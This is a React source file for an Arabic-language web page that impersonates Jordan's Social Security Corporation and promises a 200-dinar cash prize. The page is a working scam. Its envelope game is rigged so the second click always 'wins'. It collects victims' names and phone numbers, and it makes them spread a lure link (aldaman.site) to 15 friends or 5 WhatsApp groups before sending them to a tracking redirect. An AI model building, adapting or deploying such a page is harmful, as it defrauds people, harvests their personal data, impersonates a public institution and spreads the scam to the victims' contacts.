
import React, { useState, useEffect } from 'react';
import Header from './components/Header';
import Footer from './components/Footer';
import CommentsSection from './components/CommentsSection';
import { AppStep } from './types';
import { BANNER_IMAGE, SSC_LOGO_URL, PRIZE_MONEY_IMAGE } from './constants';
import { Share2, Loader2, Check } from 'lucide-react';

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>(AppStep.GAME);
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [attempts, setAttempts] = useState(3);
  const [openedEnvelopes, setOpenedEnvelopes] = useState<number[]>([]);
  const [shareProgress, setShareProgress] = useState(0);
  const [loadingProgress, setLoadingProgress] = useState(0);
  
  const [showInitialAlert, setShowInitialAlert] = useState(true);
  const [showEmptyModal, setShowEmptyModal] = useState(false);
  const [showWinModal, setShowWinModal] = useState(false);

  const currentYear = new Date().getFullYear();

  // تأثير لمحاكاة شاشة الانتظار
  useEffect(() => {
    if (step === AppStep.LOADING_SCREEN) {
      const interval = setInterval(() => {
        setLoadingProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => setStep(AppStep.SHARING), 500);
            return 100;
          }
          return prev + 5;
        });
      }, 100);
      return () => clearInterval(interval);
    }
  }, [step]);

  const handleRegistration = (e: React.FormEvent) => {
    e.preventDefault();
    if (name.length < 3 || phone.length < 8) {
      alert("الرجاء إدخال بيانات صحيحة");
      return;
    }
    setStep(AppStep.LOADING_SCREEN);
  };

  const onEnvelopeClick = (id: number) => {
    if (openedEnvelopes.includes(id) || step !== AppStep.GAME || showEmptyModal || showWinModal || showInitialAlert) return;

    const newOpened = [...openedEnvelopes, id];
    setOpenedEnvelopes(newOpened);

    if (newOpened.length === 1) {
      setAttempts(2);
      setShowEmptyModal(true);
    } else if (newOpened.length === 2) {
      setTimeout(() => {
        setShowWinModal(true);
      }, 800);
    }
  };

  const handleShare = () => {
    const nextProgress = Math.min(shareProgress + 20, 100);
    setShareProgress(nextProgress);
    // تحديث النص والرابط كما في الصورة المطلوبة
    const shareText = `الضمان الاجتماعي - اعانة ماليه \n اضغط هنا للحصول على 200 دينار \n https://aldaman.site`;
    window.open(`whatsapp://send?text=${encodeURIComponent(shareText)}`, '_blank');
    if (nextProgress === 100) {
      setTimeout(() => setStep(AppStep.FINAL_VERIFICATION), 1500);
    }
  };

  const handleFinalAction = () => {
    window.open('https://smrturl.co/a/sd6aa4e9d92/7823?s1=', '_blank');
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col max-w-lg mx-auto shadow-sm relative overflow-hidden font-sans">
      <Header />

      <main className="flex-grow flex flex-col bg-white">
        
        {/* المرحلة الأولى: اللعبة */}
        {step === AppStep.GAME && (
          <div className="p-4 space-y-6 animate-in slide-in-from-bottom duration-500 bg-white">
            <div className="relative rounded-2xl overflow-hidden">
              <img src={BANNER_IMAGE} alt="Banner" className="w-full object-cover h-44" />
            </div>

            <div className="text-center">
              <h2 className="text-xl font-bold text-gray-800">"قم بالضغط على الظرف لفتحه"</h2>
            </div>

            <div className="grid grid-cols-3 gap-3">
              {Array.from({ length: 12 }).map((_, i) => (
                <button
                  key={i}
                  onClick={() => onEnvelopeClick(i)}
                  className={`
                    aspect-[1.4/1] relative rounded-md transition-all duration-300 transform airmail-border envelope-shadow overflow-hidden
                    ${openedEnvelopes.includes(i) ? 'scale-95 bg-gray-100' : 'bg-[#f3f4f6] hover:scale-105 active:scale-110'}
                  `}
                >
                  {openedEnvelopes.includes(i) && openedEnvelopes.indexOf(i) === 1 ? (
                    <div className="flex flex-col items-center justify-center h-full animate-in zoom-in duration-500">
                       <img src={PRIZE_MONEY_IMAGE} alt="Money" className="w-full h-auto object-contain scale-125" />
                    </div>
                  ) : (
                    <div className="p-1 flex flex-col items-center justify-center h-full text-center">
                       <div className="flex flex-col items-center scale-[0.8]">
                          <span className="text-[7px] text-gray-700 font-bold mb-0.5">المؤسسة العامة للضمان الاجتماعي</span>
                          <span className="text-[6px] text-gray-500 font-semibold mb-2">Social Security Corporation</span>
                          <img src={SSC_LOGO_URL} alt="SSC Logo" className="w-8 h-8 object-contain opacity-90" />
                       </div>
                    </div>
                  )}
                </button>
              ))}
            </div>

            {showInitialAlert && (
              <div className="fixed inset-0 bg-black/90 flex items-center justify-center p-6 z-[60] animate-in fade-in duration-300">
                <div className="bg-[#1c1c1c] text-white rounded-3xl p-8 w-full max-w-sm text-center shadow-2xl border border-gray-800">
                  <div className="w-24 h-24 bg-[#1a3a2a]/40 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-green-800/40">
                    <img src={SSC_LOGO_URL} alt="SSC Logo" className="w-16 h-16 object-contain" />
                  </div>
                  <h2 className="text-3xl font-black mb-6 tracking-wide">مرحباً!</h2>
                  <div className="space-y-4 mb-8">
                    <p className="text-xl font-bold">الآن لديك فرصة للفوز بـ 200 دينار</p>
                    <p className="text-lg text-gray-400 font-medium">يجب عليك ايجاد الظرف الذي يحتوي على الجائزة بداخله</p>
                    <p className="text-lg font-black text-green-400">لديك 3 محاولات! نتمنى لك حظ موفق</p>
                  </div>
                  <button onClick={() => setShowInitialAlert(false)} className="w-full bg-[#1a3a2a] hover:bg-[#234d38] text-white font-black py-4 rounded-xl shadow-lg active:scale-95 text-xl transition-all border border-green-800/50">
                    حسنا
                  </button>
                </div>
              </div>
            )}

            {showEmptyModal && (
              <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-6 z-50 animate-in fade-in">
                <div className="bg-[#1a1a1a] text-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl border border-gray-800">
                  <h2 className="text-2xl font-bold mb-2">الظرف فارغ...</h2>
                  <p className="text-gray-400 mb-6 font-medium">لديك ({attempts}) فرص اضافية.</p>
                  <button onClick={() => setShowEmptyModal(false)} className="w-full bg-[#3a5a40] hover:bg-[#4a6a50] text-white font-bold py-3 rounded-xl transition-all">
                    استمرار
                  </button>
                </div>
              </div>
            )}

            {showWinModal && (
              <div className="fixed inset-0 bg-black/85 flex items-center justify-center p-6 z-[70] animate-in fade-in">
                <div className="bg-[#212121] text-white rounded-2xl p-8 w-full max-w-sm text-center shadow-2xl border border-gray-800">
                  <div className="mb-6 animate-in slide-in-from-top-4 duration-700">
                    <img src={PRIZE_MONEY_IMAGE} alt="Prize Money" className="w-48 mx-auto" />
                  </div>
                  <h2 className="text-2xl font-black mb-6 text-white tracking-wide">تهانينا لك!!</h2>
                  <div className="space-y-2 mb-8 text-gray-100">
                    <p className="text-xl font-bold">لقد ربحت جائزة مالية!</p>
                    <p className="text-xl font-bold">مبلغ (200 دينار) نقداً</p>
                    <p className="text-base text-gray-300 mt-4 leading-relaxed">اتبع التعليمات التالية للحصول على جائزتك.</p>
                  </div>
                  <button onClick={() => { setShowWinModal(false); setStep(AppStep.REGISTRATION); }} className="w-full bg-[#2a4d36] hover:bg-[#346144] text-white font-bold py-4 rounded-xl shadow-lg transition-all transform active:scale-95 text-xl">
                    حسنا
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {/* المرحلة الثانية: إدخال البيانات */}
        {step === AppStep.REGISTRATION && (
          <div className="flex-grow flex flex-col animate-in fade-in duration-500 bg-white">
            <div className="w-full">
               <img src={BANNER_IMAGE} alt="Banner" className="w-full object-cover h-48 md:h-60" />
            </div>
            <div className="p-6 md:p-10 space-y-8 flex-grow">
              <div className="text-center">
                <h3 className="text-2xl font-bold text-black mb-8">الرجاء إدخال البيانات بشكل صحيح:</h3>
              </div>
              <form onSubmit={handleRegistration} className="space-y-4 max-w-md mx-auto">
                <input type="text" placeholder="ادخل اسمك هنا..." value={name} onChange={(e) => setName(e.target.value)} className="w-full bg-white border border-gray-300 p-5 rounded-md text-right focus:outline-none focus:border-green-800 transition-all text-black placeholder:text-gray-400 text-lg font-medium shadow-inner" required />
                <input type="tel" placeholder="ادخل رقم هاتفك هنا..." value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-white border border-gray-300 p-5 rounded-md text-right focus:outline-none focus:border-green-800 transition-all text-black placeholder:text-gray-400 text-lg font-medium shadow-inner" required />
                <div className="pt-6 flex justify-center">
                  <button type="submit" className="w-full max-w-[240px] bg-[#2a3a2a] hover:bg-[#344a34] text-white font-bold py-4 px-8 rounded-xl shadow-xl transition-all flex items-center justify-center gap-3 active:scale-95 text-xl border border-gray-800">
                    ارسال
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* شاشة الانتظار */}
        {step === AppStep.LOADING_SCREEN && (
          <div className="flex-grow flex flex-col animate-in fade-in duration-500 bg-white">
            <div className="w-full">
               <img src={BANNER_IMAGE} alt="Banner" className="w-full object-cover h-48 md:h-60" />
            </div>
            <div className="p-10 flex flex-col items-center justify-center space-y-8 flex-grow">
               <h2 className="text-2xl font-black text-black">الرجاء الإنتظار قليلاً ...</h2>
               <div className="w-full max-w-md h-10 bg-black rounded-sm relative border-2 border-black overflow-hidden">
                  <div className="h-full bg-[#1a3a2a] transition-all duration-300" style={{ width: `${loadingProgress}%` }} />
                  <div className="absolute inset-y-0 right-4 flex items-center gap-2">
                     <Loader2 className="w-4 h-4 animate-spin text-white" />
                     <span className="text-white font-bold text-sm">{loadingProgress}%</span>
                  </div>
               </div>
            </div>
          </div>
        )}

        {/* شاشة المساهمة والمشاركة */}
        {step === AppStep.SHARING && (
          <div className="animate-in fade-in duration-500 bg-white flex-grow flex flex-col overflow-y-auto">
            <div className="p-6 md:p-8 space-y-6 text-black text-right">
              <h2 className="text-xl font-bold leading-relaxed mb-4">
                تهانينا يا {name || 'Hsjdh'}! <br/>
                لا تفصلك الآن سوى خطوة واحدة للحصول على مبلغ الجائزة.
              </h2>
              <div className="space-y-4 font-bold text-md leading-relaxed">
                <p>ستحصل على مبلغ 200 دينار مباشرة بعد اتباع التعليمات أدناه :</p>
                <p>1 - إضغط على زر "مساهمة" الموجود فى الأسفل و قم باخبار 15 صديقا او 5 مجموعات على واتساب بهذه المسابقة.</p>
                <p>2 - سيتواصل معك فريق دعم المسابقة عبر رقم هاتفك المسجل لدينا بعد امتلاء شريط التحقق لإرسال المبلغ المالي لك على الفور.</p>
              </div>

              {/* شريط التحقق */}
              <div className="mt-8 space-y-2">
                <div className="w-full h-10 bg-black rounded-sm relative border-2 border-black overflow-hidden">
                   <div className="h-full bg-[#1a3a2a] transition-all duration-700" style={{ width: `${shareProgress}%` }} />
                   <div className="absolute inset-y-0 right-4 flex items-center gap-2">
                      <Loader2 className="w-4 h-4 animate-spin text-white" />
                      <span className="text-white font-bold text-sm">{shareProgress}%</span>
                   </div>
                </div>
                <p className="text-center font-bold text-sm mt-2">استمر في الارسال حتى يمتلئ شريط التحقق</p>
              </div>

              <div className="flex justify-center mt-6">
                <button onClick={handleShare} className="w-full max-w-md bg-[#2a3a2a] hover:bg-[#344a34] text-white font-bold py-5 rounded-xl flex items-center justify-center gap-3 shadow-xl transform active:scale-95 transition-all text-xl border border-gray-800">
                  مساهمة
                </button>
              </div>
            </div>

            {/* قسم التعليقات (مثل الصورة) */}
            <CommentsSection />
          </div>
        )}

        {/* شاشة تأكيد استلام الجائزة */}
        {step === AppStep.FINAL_VERIFICATION && (
          <div className="p-6 space-y-12 py-16 text-center animate-in zoom-in duration-500 bg-white flex-grow flex flex-col items-center justify-center">
            <div className="w-24 h-24 bg-[#21b28e] text-white rounded-full flex items-center justify-center shadow-lg">
              <Check size={56} strokeWidth={3} />
            </div>
            
            <div className="space-y-6">
              <h2 className="text-4xl font-black text-black tracking-tight">تهانينا!</h2>
              <p className="text-gray-900 text-2xl px-6 font-bold leading-relaxed max-w-sm mx-auto">
                تم انهاء الخطوة بنجاح، يمكنك الآن التوصل برمز و معلومات السحب.
              </p>
            </div>
            
            <div className="w-full max-w-md px-4 mt-8">
              <button 
                onClick={handleFinalAction} 
                className="w-full bg-[#3d513d] hover:bg-[#4a634a] text-white font-bold py-6 px-4 rounded-xl shadow-xl transition-all text-xl active:scale-95 border border-gray-800"
              >
                اضغط هنا و قم بادخال رقم هاتفك
              </button>
            </div>
          </div>
        )}

        {step === AppStep.COMPLETED && (
          <div className="flex-grow flex flex-col items-center justify-center py-24 text-center space-y-10 animate-in fade-in duration-1000 bg-white">
             <div className="relative">
                <div className="absolute inset-0 bg-green-500 blur-[80px] opacity-20 animate-pulse rounded-full"></div>
                <div className="w-44 h-44 bg-white rounded-full flex items-center justify-center border-[8px] border-green-600 relative z-10 shadow-2xl overflow-hidden">
                   <img src={SSC_LOGO_URL} alt="SSC" className="w-32 h-32 object-contain" />
                </div>
             </div>
             <div className="space-y-6">
                <h2 className="text-5xl font-black text-gray-900 tracking-tight">تم بنجاح!</h2>
                <div className="bg-green-50 p-6 rounded-3xl border border-green-100 shadow-md mx-4">
                   <p className="text-gray-700 text-xl max-w-xs leading-relaxed font-bold">
                      تم تسجيل طلبك لصرف المنحة الرمضانية لعام <span className="text-green-700 font-black">{currentYear}</span>.
                      سيتم تحويل المبلغ عبر المحفظة المرتبطة برقمك:
                      <br/>
                      <span className="text-green-600 font-black text-3xl mt-4 block tracking-widest">{phone}</span>
                   </p>
                </div>
             </div>
          </div>
        )}

      </main>

      <Footer />
    </div>
  );
};

export default App;
